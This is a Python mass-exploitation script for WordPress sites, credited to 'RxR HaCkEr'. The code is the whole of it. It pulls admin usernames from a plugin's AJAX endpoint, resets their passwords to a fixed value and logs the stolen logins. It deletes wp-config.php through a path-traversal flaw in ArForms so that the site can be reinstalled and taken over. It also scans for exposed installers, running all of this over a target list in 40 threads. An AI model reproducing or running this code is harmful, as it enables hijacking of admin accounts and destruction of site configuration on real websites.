# https://t.me/clean_tools_net
import requests, urllib, re, sys, json, os
from multiprocessing.dummy import Pool as ThreadPool
from time import time as timer
from platform import system	
from colorama import Fore								
from colorama import Style								
from pprint import pprint								
from colorama import init												
init(autoreset=True)										
####### Colors	 ######	
fr  =   Fore.RED											
fc  =   Fore.CYAN											
fw  =   Fore.WHITE											
fg  =   Fore.GREEN											
sd  =   Style.DIM											
sn  =   Style.NORMAL										
sb  =   Style.BRIGHT
####################### 
# Coded By RxR HaCkEr #
#######################
try:
    with open(sys.argv[1], 'r') as f:
        woh = f.read().splitlines()
except IOError:
    pass
woh = list((woh))


headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0",
		  "Accept": "*/*",
		  "Accept-Language": "en-US,en;q=0.5",
		  "Accept-Encoding": "gzip, deflate",
		  "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
		  "X-Requested-With": "XMLHttpRequest",
		  "Connection": "close"}

		  
def Banners():

	if system() == 'Linux':
		os.system('clear')
	if system() == 'Windows':
		os.system('cls')
		
	banner = """{}{} \n \n



		
			______       ______   _   _         _____  _     _____          
			| ___ \      | ___ \ | | | |       /  __ \| |   |  ___|        
			| |_/ /__  __| |_/ / | |_| |  __ _ | /  \/| | __| |__  _ __  
			|    / \ \/ /|    /  |  _  | / _` || |    | |/ /|  __|| '__|  
			| |\ \ >  < | |\ \ | | | || (_| || \__/\|   < | |___| |    
			\_| \_|/_/\_\\_| \_| \_| |_/ \__,_| \____/|_|\_\\____/|_|      
		 
					Coded By RxR HaCkEr 
					   Skype:a.789a
						 
						 
											
			# reset pwd , del confing , install wp
			# SimpLe TooLs :D 

				\n""".format(fc, sb)
		
	print banner
	
def Domains(url):
	
	if '://' not in url:
		return "http://" + url
	else:
		return url
	
		
			
def enum(url):

	try:

		for i in range(5):
			enum = urllib.urlencode({'cs_uid': i, 'action': 'cs_employer_ajax_profile'})
			data = requests.post(url + "/wp-admin/admin-ajax.php", data=enum, headers=headers, verify=False)
			login = re.findall(r'name="display_name" value=\"(.*?)\"',str(data.content))
			for user in login:
				return user

	except Exception as Exx:
		print(Exx)


def wp_reset(site):

	try:
	
		url = Domains(site)
		
		login = enum(url)
		
		pw = "rxrhack1337"
		
		reset = urllib.urlencode({'new_pass': pw, 'confirm_new_pass': pw, 'user_login': login, 'action': 'cs_reset_pass'})
		data = requests.post(url + "/wp-admin/admin-ajax.php", data=reset, headers=headers, verify=False)

		res = re.findall(r'<i class=\"(.*?)\"',str(data.content))
		for i in res:
			if i == str('icon-checkmark6') and data.status_code == 200:
				print("Target :{}  username :{} password :{} {}{}successfully reset ! =)").format(url,login,pw,sb,fg)
				open('reset_success.txt', 'a').write(url + "|" + login + "|" + pw + "\n")
			else:
				print('\nTarget :{} {}{}Error ! Cannot reset password.').format(url,sb,fr)
				
				
				
	except Exception as Ex:
		print(Ex)
		
		
def Arforms_config(site):
	
	try:
	
		url = Domains(site)

		payload = {
		  "action":"arf_delete_file",
		  "file_name":"../../../../wp-config.php"
		  }

		r = requests.post(url + "/wp-admin/admin-ajax.php", data=payload, headers=headers)

		sh = requests.get(url + "/wp-admin")
		
		if 'id="setup" method="post" action="?step=0' in sh.content:
			print("Target : {}  {}{}Vulnerability :D").format(url,sb,fg)
			open('arforms_del.txt', 'a').write(url + "\n")
		else:
			print("Target : {}  {}{}Not Vulnerability ").format(url,sb,fr)

	except:
		pass
		

def wp_install(site):
	
	try:
		url = Domains(site)
		
		list_path = ['/','/new', '/wp', '/wordpress']
		
		for path in list_path:
			check = requests.get(url + path + "/wp-admin/setup-config.php" ,headers=headers)
			if '<a href="setup-config.php?step=1' in check.content:
				print("Target : {} {}{}Vulnerability ").format(url,sb,fg)
				open('wp_install.txt', 'a').write(url + path + "/wp-admin/setup-config.php" + "\n")
			else:
				print("Target : {} {}{}Not Vulnerability ").format(url,sb,fr)
	
	except:
		pass

def Run_Work(site):

	try:
		
		url = Domains(site)
		
		# bug for  reset the user of the admin :D
		wp_reset(url)
		
		# bug for del the config then u can re install it :D
		
		Arforms_config(url)
		
		# check installer wp 
		wp_install(url)
		
	except:
		pass


Banners()		
def Main():

    try:
        start = timer()
        pp = ThreadPool(40)
        pr = pp.map(Run_Work, woh)
        print('Time: ' + str(timer() - start) + ' seconds')
    except:
        pass


if __name__ == '__main__':
    Main()
